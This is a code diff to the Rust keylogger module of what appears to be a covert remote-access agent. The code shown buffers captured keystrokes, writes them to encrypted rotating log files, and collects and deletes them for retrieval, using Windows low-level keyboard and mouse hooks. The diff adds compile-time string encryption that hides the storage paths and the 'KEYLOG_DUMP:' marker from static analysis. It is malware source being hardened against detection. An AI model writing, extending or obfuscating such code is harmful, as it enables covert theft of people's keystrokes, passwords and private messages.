@@ -1,5 +1,7 @@
 // ./src/agent/keylogger.rs
 
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use std::sync::{Arc, Mutex, OnceLock};
 use std::io::{Read, Write};
 use std::fs::{self, OpenOptions};
@@ -24,10 +26,16 @@ use crate::utils;
 use serde_json::json;
 
 // --- CONFIGURATION ---
-const STORAGE_DIR: &str = "./data";
-const CURRENT_LOG_FILE: &str = "current.bin";
-const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024; // 10 MB
-const MAX_FILE_AGE_SECS: u64 = 30 * 60;      // 30 Minutes
+// Keylogger storage policy. The typed config tree has no keylogger section;
+// these stay as local constants (gap reported for config-core).
+static STORAGE_DIR: OnceLock<String> = OnceLock::new();
+static CURRENT_LOG_FILE: OnceLock<String> = OnceLock::new();
+
+// Keylogger storage paths, decrypted once and cached (were plain consts).
+fn storage_dir() -> &'static str { STORAGE_DIR.get_or_init(|| aes_str!("./data")) }
+fn current_log_file() -> &'static str { CURRENT_LOG_FILE.get_or_init(|| aes_str!("current.bin")) }
+fn max_file_size() -> u64 { crate::config::config().agent.keylogger_max_bytes }
+fn max_file_age_secs() -> u64 { crate::config::config().agent.keylogger_max_age_secs }
 
 // --- GLOBAL BUFFER (sound, no unsafe) ---
 static KEYLOG_BUFFER: OnceLock<Arc<Mutex<String>>> = OnceLock::new();
@@ -67,7 +75,7 @@ pub fn init_buffer() -> Arc<Mutex<String>> {
     let buf_clone = buffer.clone();
     thread::spawn(move || {
         // Ensure storage directory exists
-        let _ = fs::create_dir_all(STORAGE_DIR);
+        let _ = fs::create_dir_all(storage_dir());
 
         loop {
             thread::sleep(Duration::from_secs(5));
@@ -101,25 +109,25 @@ pub fn init_buffer() -> Arc<Mutex<String>> {
 
 // Rotates current.bin -> archive_<ts>.bin if limits exceeded
 fn check_and_rotate_log() -> std::io::Result<()> {
-    let current_path = Path::new(STORAGE_DIR).join(CURRENT_LOG_FILE);
+    let current_path = Path::new(storage_dir()).join(current_log_file());
     if !current_path.exists() { return Ok(()); }
 
     let metadata = fs::metadata(&current_path)?;
 
     // Check Size
-    let size_exceeded = metadata.len() >= MAX_FILE_SIZE;
+    let size_exceeded = metadata.len() >= max_file_size();
 
     // Check Age
     let age_exceeded = if let Ok(created) = metadata.created() {
         if let Ok(elapsed) = created.elapsed() {
-            elapsed.as_secs() >= MAX_FILE_AGE_SECS
+            elapsed.as_secs() >= max_file_age_secs()
         } else { false }
     } else { false };
 
     if size_exceeded || age_exceeded {
         let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
         let archive_name = format!("archive_{}.bin", timestamp);
-        let archive_path = Path::new(STORAGE_DIR).join(archive_name);
+        let archive_path = Path::new(storage_dir()).join(archive_name);
 
         fs::rename(current_path, archive_path)?;
     }
@@ -128,7 +136,7 @@ fn check_and_rotate_log() -> std::io::Result<()> {
 }
 
 fn secure_append(text: &str) -> Result<(), Box<dyn std::error::Error>> {
-    let path = Path::new(STORAGE_DIR).join(CURRENT_LOG_FILE);
+    let path = Path::new(storage_dir()).join(current_log_file());
 
     let key = get_local_storage_key();
     let cipher = Aes256Gcm::new(&key.into());
@@ -153,7 +161,7 @@ fn secure_append(text: &str) -> Result<(), Box<dyn std::error::Error>> {
 
 // 3. Retrieve All Logs (Iterate Archives + Current, Decrypt, Combine, Delete)
 pub fn get_logs() -> String {
-    let dir = Path::new(STORAGE_DIR);
+    let dir = Path::new(storage_dir());
     if !dir.exists() { return String::new(); }
 
     let mut files_to_process = Vec::new();
@@ -177,7 +185,7 @@ pub fn get_logs() -> String {
 
     let key = get_local_storage_key();
     let cipher = Aes256Gcm::new(&key.into());
-    let mut combined_data = String::from("KEYLOG_DUMP:\n");
+    let mut combined_data = format!("{}\n", strcrypt::aes_str!("KEYLOG_DUMP:"));
 
     for path in &files_to_process {
         if let Ok(mut file) = fs::File::open(path) {
@@ -254,6 +262,8 @@ mod windows {
     type LPARAM = isize;
     type HANDLE = *mut c_void;
 
+    // Win32 hook/message constants - OS-fixed (winuser.h), not mirrored by
+    // the typed FFI config, so they stay const.
     const WH_KEYBOARD_LL: i32 = 13;
     const WH_MOUSE_LL: i32 = 14;
     const PM_REMOVE: u32 = 0x0001;
